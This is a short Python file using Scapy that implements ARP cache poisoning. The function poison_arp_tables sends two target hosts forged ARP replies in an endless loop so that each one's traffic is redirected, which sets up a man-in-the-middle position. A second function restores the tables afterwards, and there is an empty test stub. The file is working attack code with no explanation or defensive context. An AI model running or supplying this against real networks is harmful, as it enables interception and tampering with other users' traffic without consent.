from scapy.all import *
from scapy_functions import *

def poison_arp_tables(target_1_ip, target_2_ip):
    target_1_mac = get_mac(target_1_ip)
    target_2_mac = get_mac(target_2_ip)

    while True:
        send(ARP(op = 2, psrc = target_2_ip, pdst = target_1_ip, hwdst = target_1_mac), verbose = False)
        send(ARP(op = 2, psrc = target_1_ip, pdst = target_2_ip, hwdst = target_2_mac), verbose = False)
        time.sleep(2)

def restore_arp_table(target_1_ip, target_2_ip):
    target_1_mac = get_mac(target_1_ip)
    target_2_mac = get_mac(target_2_ip)
    send(ARP(op = 2, psrc = target_2_ip, hwsrc = target_2_mac, pdst = target_1_ip, hwdst = target_1_mac), verbose = False)
    send(ARP(op = 2, psrc = target_1_ip, hwsrc = target_1_mac, pdst = target_2_ip, hwdst = target_2_mac), verbose = False)


def testFunction():
    pass
    